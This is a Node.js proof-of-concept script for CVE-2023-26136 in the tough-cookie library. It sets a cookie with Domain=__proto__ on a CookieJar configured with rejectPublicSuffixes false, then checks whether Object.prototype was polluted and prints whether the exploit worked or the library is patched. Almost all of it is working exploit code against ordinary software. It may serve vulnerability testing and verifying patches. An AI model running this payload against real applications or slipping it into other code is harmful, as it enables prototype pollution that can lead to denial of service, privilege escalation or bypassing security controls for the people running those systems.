#!/usr/bin/env node

/**
 * CVE-2023-26136 Prototype Pollution Exploit
 * 
 * This script demonstrates the prototype pollution vulnerability in tough-cookie 2.5.0
 * when using CookieJar with rejectPublicSuffixes=false mode.
 * 
 * The vulnerability allows an attacker to pollute the Object.prototype by setting
 * cookies with malicious domain names like "__proto__".
 * 
 * POTENTIAL DAMAGE:
 * - Can modify behavior of all objects in the application
 * - May lead to denial of service, privilege escalation, or remote code execution
 * - Affects the entire Node.js process and all objects created after pollution
 * - Can be used to bypass security controls or modify application logic
 */

const tough = require('./lib/cookie');

console.log('CVE-2023-26136 Prototype Pollution Exploit');
console.log('==========================================\n');

// Create a CookieJar with rejectPublicSuffixes=false (vulnerable configuration)
const jar = new tough.CookieJar(undefined, {
  rejectPublicSuffixes: false
});

console.log('Attempting prototype pollution attack...\n');

// Step 1: Try to pollute the prototype with a malicious cookie
// This cookie has Domain=__proto__ which will attempt to set properties on Object.prototype
jar.setCookieSync(
  "Slonser=polluted; Domain=__proto__; Path=/notauth",
  "https://__proto__/admin"
);

// Step 2: Set a legitimate cookie to verify the attack worked
jar.setCookieSync(
  "Auth=Lol; Domain=google.com; Path=/notauth",
  "https://google.com/"
);

// Step 3: Check if the prototype was polluted
const testObject = {};

console.log('Checking if Object.prototype was polluted...');
console.log('testObject["/notauth"] =', testObject["/notauth"]);

if (testObject["/notauth"] !== undefined) {
  console.log('\n🚨 EXPLOITED SUCCESSFULLY 🚨');
  console.log('The prototype pollution attack was successful!');
  console.log('Object.prototype has been modified, affecting all objects in the application.');
  console.log('\nThis demonstrates the critical security vulnerability CVE-2023-26136.');
  console.log('The application is now vulnerable to various attacks including:');
  console.log('- Denial of Service');
  console.log('- Privilege Escalation');
  console.log('- Remote Code Execution');
  console.log('- Security Control Bypass');
} else {
  console.log('\n✅ EXPLOIT FAILED ✅');
  console.log('The prototype pollution attack was blocked.');
  console.log('This indicates the vulnerability has been patched.');
}

console.log('\nExploit completed.'); 